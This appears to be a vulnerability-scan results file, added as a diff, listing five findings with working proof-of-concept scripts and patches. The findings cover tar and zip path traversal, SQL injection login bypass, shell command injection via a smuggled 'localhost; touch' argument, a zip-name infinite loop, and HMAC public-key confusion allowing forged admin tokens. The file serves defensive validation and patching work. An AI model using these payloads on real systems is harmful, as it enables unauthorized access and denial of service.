@@ -1,0 +1,153 @@
+{
+  "validator_verdict": "confirmed",
+  "hunts": {
+    "src/data-isolation-and-lifecycle": [
+      {
+        "id": "cve-2007-4559",
+        "verdict": "needs_validation",
+        "title": "Directory traversal via tarfile.extractall (CVE-2007-4559)",
+        "attack_class": "data-isolation-and-lifecycle",
+        "severity": "high",
+        "threat_model": {
+          "attacker": "attacker who supplies the tar archive",
+          "boundary": "archive member path escapes the extraction directory"
+        },
+        "location": {
+          "file": "src/extract.py",
+          "line": 9,
+          "symbol": "extract"
+        },
+        "description": "extract() calls tarfile.extractall without validating member names, so '../' members write outside dest.",
+        "poc": {
+          "kind": "script",
+          "content": "import io, os, tarfile, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('extract', 'src/extract.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)\ntarp = os.path.join(work, 'mal.tar')\nwith tarfile.open(tarp, 'w') as tf:\n    data = b'owned'\n    info = tarfile.TarInfo('../pwned.txt'); info.size = len(data)\n    tf.addfile(info, io.BytesIO(data))\ntry:\n    m.extract(tarp, dest)\nexcept Exception:\n    pass\nassert os.path.exists(os.path.join(work, 'pwned.txt')), 'no escape'\nprint('TRAVERSAL_OK')\n",
+          "observed": "TRAVERSAL_OK"
+        },
+        "patch": "-        tf.extractall(dest)\n+        for member in tf.getmembers():\n+            resolved = os.path.realpath(os.path.join(dest, member.name))\n+            if not resolved.startswith(os.path.realpath(dest) + os.sep):\n+                raise Exception('unsafe path in tar: ' + member.name)\n+        tf.extractall(dest)"
+      },
+      {
+        "id": "zip-slip",
+        "verdict": "needs_validation",
+        "title": "Zip Slip path traversal in unzip (CWE-22)",
+        "attack_class": "data-isolation-and-lifecycle",
+        "severity": "high",
+        "threat_model": {
+          "attacker": "attacker who supplies the zip archive",
+          "boundary": "archive entry path escapes the extraction directory"
+        },
+        "location": {
+          "file": "src/unzip.py",
+          "line": 10,
+          "symbol": "unzip"
+        },
+        "description": "unzip() joins the entry name onto dest without checking the resolved path, so '../' entries escape.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, zipfile, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('unzip', 'src/unzip.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)\nzp = os.path.join(work, 'mal.zip')\nwith zipfile.ZipFile(zp, 'w') as zf:\n    zf.writestr('../pwned.txt', b'owned')\ntry:\n    m.unzip(zp, dest)\nexcept Exception:\n    pass\nassert os.path.exists(os.path.join(work, 'pwned.txt')), 'no escape'\nprint('ZIPSLIP_OK')\n",
+          "observed": "ZIPSLIP_OK"
+        },
+        "patch": "-            target = os.path.join(dest, name)\n+            target = os.path.join(dest, name)\n+            if not os.path.realpath(target).startswith(os.path.realpath(dest) + os.sep):\n+                raise Exception('zip slip: ' + name)"
+      }
+    ],
+    "src/web-protocol-and-auth": [
+      {
+        "id": "sqli",
+        "verdict": "needs_validation",
+        "title": "SQL injection auth bypass in login (CWE-89)",
+        "attack_class": "web-protocol-and-auth",
+        "severity": "critical",
+        "threat_model": {
+          "attacker": "unauthenticated remote user controlling username/password",
+          "boundary": "input crosses into SQL and bypasses authentication"
+        },
+        "location": {
+          "file": "src/auth.py",
+          "line": 9,
+          "symbol": "login"
+        },
+        "description": "login() builds the SQL by string formatting, so a crafted password makes the WHERE clause always true.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, sqlite3, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('auth', 'src/auth.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); db = os.path.join(work, 'app.db')\ncon = sqlite3.connect(db)\ncon.execute('CREATE TABLE users(id INTEGER, name TEXT, password TEXT)')\ncon.execute(\"INSERT INTO users VALUES (1, 'admin', 's3cret')\"); con.commit(); con.close()\nok = m.login(db, 'admin', \"x' OR '1'='1\")\nassert ok is True, 'no bypass'\nprint('SQLI_OK')\n",
+          "observed": "SQLI_OK"
+        },
+        "patch": "-    query = \"SELECT id FROM users WHERE name = '%s' AND password = '%s'\" % (username, password)\n-    row = cur.execute(query).fetchone()\n+    row = cur.execute(\"SELECT id FROM users WHERE name = ? AND password = ?\", (username, password)).fetchone()"
+      }
+    ],
+    "src/cloud-and-deployment": [
+      {
+        "id": "cmd-injection",
+        "verdict": "needs_validation",
+        "title": "OS command injection in ping (CWE-78)",
+        "attack_class": "cloud-and-deployment",
+        "severity": "critical",
+        "threat_model": {
+          "attacker": "user controlling the host argument",
+          "boundary": "input crosses into a shell command line"
+        },
+        "location": {
+          "file": "src/net.py",
+          "line": 7,
+          "symbol": "ping"
+        },
+        "description": "ping() interpolates host into a shell=True command, so '; <cmd>' runs arbitrary commands.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('net', 'src/net.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); marker = os.path.join(work, 'pwned')\nm.ping('localhost; touch ' + marker)\nassert os.path.exists(marker), 'no injection'\nprint('CMDI_OK')\n",
+          "observed": "CMDI_OK"
+        },
+        "patch": "-    cmd = \"ping -c 1 \" + host\n-    return subprocess.run(cmd, shell=True, capture_output=True).returncode\n+    return subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True).returncode"
+      }
+    ],
+    "ziptree/resource-exhaustion-and-availability": [
+      {
+        "id": "ancestry-dos",
+        "verdict": "needs_validation",
+        "title": "Unbounded loop on zip entry names with repeated leading separators",
+        "attack_class": "resource-exhaustion-and-availability",
+        "severity": "high",
+        "threat_model": {
+          "attacker": "attacker who supplies the zip archive",
+          "boundary": "a crafted entry name makes path enumeration loop forever"
+        },
+        "location": {
+          "file": "ziptree/__init__.py",
+          "line": 56,
+          "symbol": "_ancestry"
+        },
+        "description": "_ancestry() stops only when the path equals a single separator, so a name beginning with repeated separators never reduces and the loop never ends, hanging any listing of the archive.",
+        "poc": {
+          "kind": "script",
+          "content": "import sys, io, zipfile, threading, os\nsys.path.insert(0, '.')\nimport ziptree\nbuf = io.BytesIO()\nwith zipfile.ZipFile(buf, 'w') as zf:\n    zf.writestr('//a/b', 'x')\nbuf.seek(0)\ndef go():\n    list(ziptree.Path(buf).iterdir())\nt = threading.Thread(target=go, daemon=True)\nt.start(); t.join(3.0)\nif t.is_alive():\n    print('DOS_HANG', flush=True); os._exit(0)\nprint('completed'); sys.exit(1)\n",
+          "observed": "DOS_HANG"
+        },
+        "patch": "-    while path and path != posixpath.sep:\n+    while path and not path.endswith(posixpath.sep):"
+      }
+    ],
+    "tokenlib/web-protocol-and-auth": [
+      {
+        "id": "hmac-key-confusion",
+        "verdict": "needs_validation",
+        "title": "Asymmetric public key accepted as an HMAC secret",
+        "attack_class": "web-protocol-and-auth",
+        "severity": "critical",
+        "threat_model": {
+          "attacker": "attacker who knows the service's public verification key",
+          "boundary": "a public key is accepted as a symmetric HMAC secret, enabling token forgery"
+        },
+        "location": {
+          "file": "tokenlib/algorithms.py",
+          "line": 193,
+          "symbol": "prepare_key"
+        },
+        "description": "HMACAlgorithm.prepare_key rejects only a fixed list of key markers, so a public key in another format (e.g. an ssh-ed25519 key) is accepted as the HMAC secret; anyone holding the public key can then forge HS256 tokens.",
+        "poc": {
+          "kind": "script",
+          "content": "import sys\nsys.path.insert(0, '.')\nimport tokenlib as jwt\npub = ('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGb9ECWmEzf6FQbrBZ9w7lshQhqowgb'\n       'qHtjdQyfp2VTO user@host')\ntry:\n    token = jwt.encode({'admin': True}, pub, algorithm='HS256')\nexcept Exception as exc:\n    print('rejected:', type(exc).__name__); sys.exit(1)\ndata = jwt.decode(token, pub, algorithms=['HS256'])\nassert data.get('admin') is True, 'verify failed'\nprint('KEYCONF_OK')\n",
+          "observed": "KEYCONF_OK"
+        },
+        "patch": "-        invalid_strings = [\n-            b\"-----BEGIN PUBLIC KEY-----\",\n-            b\"-----BEGIN CERTIFICATE-----\",\n-            b\"-----BEGIN RSA PUBLIC KEY-----\",\n-            b\"ssh-rsa\",\n-        ]\n-\n-        if any(string_value in key for string_value in invalid_strings):\n+        if key.lstrip().startswith(b\"ssh-\") or b\"-----BEGIN\" in key:"
+      }
+    ]
+  }
+}
